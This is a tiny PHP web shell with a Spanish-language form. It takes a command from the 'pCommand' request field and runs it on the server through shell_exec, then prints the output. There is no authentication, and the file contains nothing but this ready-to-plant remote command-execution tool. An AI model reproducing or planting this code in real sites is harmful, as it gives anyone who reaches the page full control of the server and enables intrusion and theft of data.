WEB SHELL
<form action="" method="post" enctype="application/x-www-form-urlencoded">
	<table style="margin-left:auto; margin-right:auto;">
		<tr>
			<td colspan="2" style="text-align:center; font-weight: bold;color: #770000;">
				Inserta el comando requerido
			</td>
		</tr>
		<tr>
			<td style="fornt-weight: bold;">Comando</td>
			<td><input type="text" name="pCommand" size="50"></td>
		</tr>
		<tr><td>&nbsp;</td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input type="submit" value="Ejecutar Comando" />
			</td>
		</tr>
	</table>
</form>
<?php
	if(isset($_REQUEST["pCommand"])) {
		echo "<pre>";
		echo shell_exec($_REQUEST["pCommand"]);
		echo "</pre>";
	}//end if
?>